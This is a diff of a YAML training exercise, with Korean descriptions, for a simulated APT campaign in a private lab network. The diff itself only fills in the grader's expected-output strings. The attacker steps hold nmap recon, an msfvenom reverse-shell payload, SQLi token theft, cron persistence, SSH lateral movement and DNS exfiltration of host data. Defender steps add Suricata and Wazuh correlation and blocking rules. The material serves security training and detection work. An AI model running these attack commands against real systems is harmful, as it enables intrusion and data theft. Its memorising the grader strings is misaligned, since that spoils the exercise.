@@ -34,7 +34,7 @@ steps:
     NSE 스크립트로 웹 경로를 열거한다.
   verify:
     type: output_contains
-    expect: null
+    expect: open
   target_vm: attacker
   script: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s
     10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum
@@ -58,7 +58,7 @@ steps:
     하고 실행하지 않는다. SQLi로 admin JWT 토큰을 획득한다.
   verify:
     type: output_contains
-    expect: null
+    expect: token
   target_vm: attacker
   script: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
     elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial
@@ -83,7 +83,7 @@ steps:
     연계한다. 실제 APT는 여러 서버에 동시에 Persistence를 설치한다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT_CAMPAIGN
   target_vm: attacker
   script: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab
     - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3
@@ -112,7 +112,7 @@ steps:
     교차 분석한다. 개별 이벤트는 기록되지만 상관 분석 부재가 Gap이다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT Campaign Detection
   target_vm: secu
   script: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" &&
     ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import
@@ -144,7 +144,7 @@ steps:
     윈도우로 탐지한다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT CAMPAIGN
   target_vm: siem
   script: 'cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign correlation
     <group name="apt_campaign"> <rule id="100400" level="15" frequency="4" timeframe="600">
@@ -172,7 +172,7 @@ steps:
     실행하여 공격자 IP를 2시간 동안 전체 인프라에서 격리한다.
   verify:
     type: output_contains
-    expect: null
+    expect: active-response
   target_vm: siem
   script: cat > /tmp/apt_active_response.xml << 'EOF' <ossec_config> <active-response>
     <command>firewall-drop</command> <location>all</location> <rules_id>100400</rules_id>
@@ -196,7 +196,7 @@ steps:
     DNS 서브도메인으로 전송한다.
   verify:
     type: output_contains
-    expect: null
+    expect: DNS Exfiltration
   target_vm: attacker
   script: cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt &&
     echo "=== DNS Exfiltration Attempt ===" && head -2 /tmp/apt_staging.txt | base64
@@ -237,7 +237,7 @@ steps:
     포함한다.
   verify:
     type: output_contains
-    expect: null
+    expect: APT Campaign Simulation
   target_vm: attacker
   script: 'crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml
     /tmp/apt_staging.txt /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt
